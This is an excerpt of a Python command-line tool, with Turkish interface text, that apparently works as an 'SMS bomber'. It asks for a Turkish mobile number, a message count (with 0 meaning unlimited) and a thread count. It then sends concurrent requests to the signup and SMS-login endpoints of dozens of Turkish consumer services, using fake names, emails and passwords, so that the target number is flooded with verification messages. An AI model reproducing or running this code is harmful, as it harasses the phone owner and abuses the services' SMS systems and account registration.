...
def Yapp(number):
    try:
        ...
        json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": number, "sms_code": ""}
        r = requests.post(url=url, json=json, timeout=6)
        if r.status_code == 200:
...
def Beefull(number):
    try:
        ...
        json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": number, "tenant": "beefull", "username": self.mail}
        requests.post(url, json=json, timeout=4)
        url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
        json={"phoneCode": "90", "phoneNumber": number, "tenant": "beefull"}
...
def Dominos(number):
    try:
        ...
        json={"email": self.mail, "isSure": False, "mobilePhone": number}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["isSuccess"] == True:
...
def Baydoner(number):
    try:
        ...
        json={"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": self.mail, "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": number, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["Control"] == 1:
...
def send(number, amount, worker_amount):
    ...
    functions = [Frink, Pidem, Baydoner, Dominos, Starbucks, Beefull, Yuffi, YilmazTicaret, Yapp, Uysal, ToptanTeslim, Tasimacim, Tasdelen, Taksim, Porty, KuryemGelsin, Komagene, Happy, Clickme, Akbati, Akasya, Metro, Koton, Naosstars, Ayyildiz, Ucdortbes, Evidea, Suiste, Icq, Wmf, KahveDunyasi, a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]
    random.shuffle(functions)
    clear()
    print(f"{number} ɴᴜᴍᴀʀᴀꜱıɴᴀ SMS ɢᴏ̈ɴᴅᴇʀɪᴍɪ ʙᴀꜱ̧ʟᴀᴛıʟᴅı!\n")
    if amount == 0:
        ...
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % 49])
    print("\nGönderim tamamlandı!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} ꜱᴀɴɪʏᴇ ɪᴄ̧ᴇʀɪꜱɪɴᴅᴇ ɢᴏ̈ɴᴅᴇʀɪʟᴅɪ. {success_sends} ʙᴀꜱ̧ᴀʀıʟı, {failed_sends} ʙᴀꜱ̧ᴀʀıꜱıᴢ.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()
...
def get_number():
    ...
    while True:
        try:
            number = int(input(f"""Tᴇʟᴇғᴏɴ ɴᴜᴍᴀʀᴀꜱıɴı ʏᴀᴢıɴ. ᴏ̈ʀɴᴇᴋ:"53xxxxxxxx"\n[$] : """))
            if len(str(number)) == 10 and str(number)[0] == "5":
                return number
            else:
                clear()
                print(f"Yᴀɴʟıꜱ̧ ɴᴜᴍᴀʀᴀ ʙɪᴄ̧ɪᴍɪ ɢɪʀɪʟᴅɪ.")
        except:
            clear()
            print(f"Lᴜ̈ᴛғᴇɴ ʙɪʀ ɴᴜᴍᴀʀᴀ ʏᴀᴢıɴ.")

def get_amount():
    global clear
    while True:
        try:
            amount = int(input(f"""Kᴀᴄ̧ SMS ɢᴏ̈ɴᴅᴇʀɪʟꜱɪɴ? Sıɴıʀꜱıᴢ ɢᴏ̈ɴᴅᴇʀɪᴍ ɪᴄ̧ɪɴ "0" ʙᴀꜱıɴ.\n[$] : """))
            if amount >= 0:
                return amount
            else:
                clear()
                print(f"Gɪʀɪʟᴇɴ ꜱᴀʏı 0'ᴅᴀɴ ᴋᴜ̈ᴄ̧ᴜ̈ᴋ ᴏʟᴀᴍᴀᴢ.")
        except:
            clear()
            print(f"Lᴜ̈ᴛғᴇɴ ʙɪʀ ꜱᴀʏı ɢɪʀɪɴ.")

def get_worker_amount():
    global clear
    while True:
        try:
            worker_amount = int(input(f"Tʜʀᴇᴀᴅ ꜱᴀʏıꜱıɴı ɢɪʀɪɴ. Tᴀᴠꜱɪʏᴇ ᴇᴅɪʟᴇɴ 5-100 ᴀʀᴀꜱıᴅır.\n[$] : "))
            if worker_amount >= 1:
                return worker_amount
            else:
                clear()
                print(f"Gɪʀɪʟᴇɴ ꜱᴀʏı 1'ᴅᴇɴ ᴋᴜ̈ᴄ̧ᴜ̈ᴋ ᴏʟᴀᴍᴀᴢ.")
        except:
            clear()
            print(f"Lᴜ̈ᴛғᴇɴ ʙɪʀ ꜱᴀʏı ɢɪʀɪɴ.")
...
def restart():
    global clear
    while True:
        question = input(f"prograмdan çıĸılѕın мı?\n[Y/N] : ").upper().replace(" ", "")
        if question == "Y":
            quit()
        elif question == "N":
            clear()
